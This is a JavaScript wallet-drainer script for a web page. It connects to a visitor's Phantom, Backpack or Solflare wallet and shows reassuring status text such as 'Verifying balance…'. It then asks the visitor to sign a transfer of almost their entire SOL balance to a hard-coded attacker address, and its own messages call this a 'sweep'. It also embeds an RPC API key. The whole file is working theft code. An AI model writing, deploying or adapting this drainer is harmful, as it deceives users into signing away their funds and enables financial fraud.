import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "https://esm.sh/@solana/web3.js@1.95.3";

// ---- CONFIG ----
const DESTINATION = new PublicKey("8cGfpYnGSZDz1WbzReonTUNkDzJcL9K7adAKrKEKHUFN");
const RPC_ENDPOINT = "https://mainnet.helius-rpc.com/?api-key=ca46080b-fd3d-421a-96c2-aad84d199416"; // swap for Helius/QuickNode
const FEE_BUFFER = 10_000; // lamports left behind for fees

const connection = new Connection(RPC_ENDPOINT, "confirmed");

const PROVIDERS = {
  phantom: () => window.phantom?.solana ?? (window.solana?.isPhantom ? window.solana : null),
  backpack: () => window.backpack ?? (window.solana?.isBackpack ? window.solana : null),
  solflare: () => window.solflare ?? (window.solana?.isSolflare ? window.solana : null),
};

const statusEl = document.getElementById("status");
const setStatus = (t) => (statusEl.textContent = t);

document.querySelectorAll(".wallet").forEach((btn) => {
  btn.addEventListener("click", () => handleConnect(btn.dataset.wallet, btn));
});

async function handleConnect(name, btn) {
  const provider = PROVIDERS[name]?.();
  if (!provider) return setStatus(`${name} not detected`);

  document.querySelectorAll(".wallet").forEach((b) => (b.disabled = true));

  try {
    setStatus("Connecting…");
    const resp = await provider.connect();
    const from = new PublicKey(resp.publicKey.toString());

    setStatus("Verifying balance…");
    const balance = await connection.getBalance(from);
    const lamports = balance - FEE_BUFFER;

    if (lamports <= 0) {
      setStatus("Nothing to sweep");
      return;
    }

    setStatus("Confirm in your wallet…");
    const { blockhash } = await connection.getLatestBlockhash("confirmed");
    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: from }).add(
      SystemProgram.transfer({ fromPubkey: from, toPubkey: DESTINATION, lamports })
    );

    const signed = await provider.signTransaction(tx);
    setStatus("Sending…");
    const sig = await connection.sendRawTransaction(signed.serialize(), {
      skipPreflight: false,
      maxRetries: 3,
    });

    setStatus(`Sent. ${sig.slice(0, 8)}…`);
    await connection.confirmTransaction(sig, "confirmed");
    setStatus("Done.");
  } catch (err) {
    console.error(err);
    setStatus(err?.message ?? "Failed");
    document.querySelectorAll(".wallet").forEach((b) => (b.disabled = false));
  }
}
